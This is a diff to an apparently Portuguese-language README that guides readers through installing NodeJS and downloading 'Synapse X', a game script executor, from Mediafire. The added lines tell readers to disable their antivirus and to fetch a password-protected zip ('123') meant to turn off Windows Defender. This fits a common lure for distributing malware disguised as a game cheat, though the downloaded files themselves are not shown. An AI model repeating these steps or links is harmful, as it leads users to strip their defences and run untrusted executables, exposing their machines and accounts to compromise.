@@ -18,8 +18,6 @@ Conceitos básicos
 ![download](https://user-images.githubusercontent.com/113463089/192170204-d5daec34-504d-4825-8aef-fb74804dc9d4.png)
   
   DEPOIS QUE ABRIR O CMD CLICK ENTER DUAS VEZES E ESPERE INSTALAR POR COMPLETO O NODEJS !
-
-  
   
 💸 <b>• Download do NodeJS 64 Bits:</b> https://nodejs.org/dist/v18.9.0/node-v18.9.0-x64.msi
 <p>
@@ -28,10 +26,18 @@ Conceitos básicos
 <br><p>
 - Segue o VÍDEO.
 
+
+DEPOIS DESATIVE O ANTI VIRUS 
+
+DOWNLOAD PARA DESATIVAR O WINDOWS DEFENDER DOWNLOAD COM A SENHA 123 https://www.mediafire.com/file/kv10ekvbbkwjlaz/Desativar_Windows_Defender.zip/file
+
+FAÇA ASSIM IGUAL ESTÁ NA IMAGEM : https://prnt.sc/2uZ4C2d4lW8F
+
+
 <p>
 https://www.youtube.com/watch?v=exeD-38mi5s
 <br>
 <br><br>
-💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/a85qqtnc3k7kp32/Synapse+X.rar/file/file
+💸 <b>• DOWNLOAD DO SYNAPSE - X:</b> https://www.mediafire.com/file/a85qqtnc3k7kp32/Synapse+X.rar/file/file
 <br>
 <br>
